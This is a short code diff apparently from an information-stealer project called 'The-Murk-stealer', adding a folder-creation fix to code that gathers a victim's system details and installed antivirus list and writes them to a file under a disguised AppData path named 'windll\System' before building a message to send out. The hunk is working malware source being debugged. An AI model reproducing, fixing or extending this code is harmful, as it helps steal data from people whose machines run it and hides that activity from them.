@@ -235,7 +235,11 @@ RAM Used: {get_size(svmem.used)}
 Antiviruses: {', '.join(Antiviruses)}
 """
     pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
-    file = open(rf'{pathtofolder}\windll\System\PC_info.txt', "w+", encoding='utf-8') 
+    try:
+        os.makedirs(rf'{pathtofolder}\windll\System')
+    except Exception as error:
+        print(error)
+    file = open(rf'{pathtofolder}\windll\System\PC_info.txt', "w+", encoding='utf-8')# here is error [https://github.com/Nick-Vinesmoke/The-Murk-stealer/issues/98]
     file.write(systeminfo)
     
     msgdata=f"""
